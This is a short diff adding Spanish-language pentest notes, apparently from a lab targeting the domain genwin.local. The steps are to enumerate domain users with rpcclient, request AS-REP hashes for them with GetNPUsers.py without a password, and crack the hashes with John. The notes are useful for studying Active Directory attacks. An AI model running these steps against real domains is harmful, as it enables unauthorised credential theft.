@@ -1,0 +1,8 @@
+
+Obtener listado usuarios con rpcclient:
+rpcclient -U "genwin.local\username%password" IP
+    - enumdomusers y nos guardamos los nombres en un archivo 
+
+GetNPUsers.py genwin.local/ -no-pass -usersfile file.txt 
+
+este hash se puede romper con john
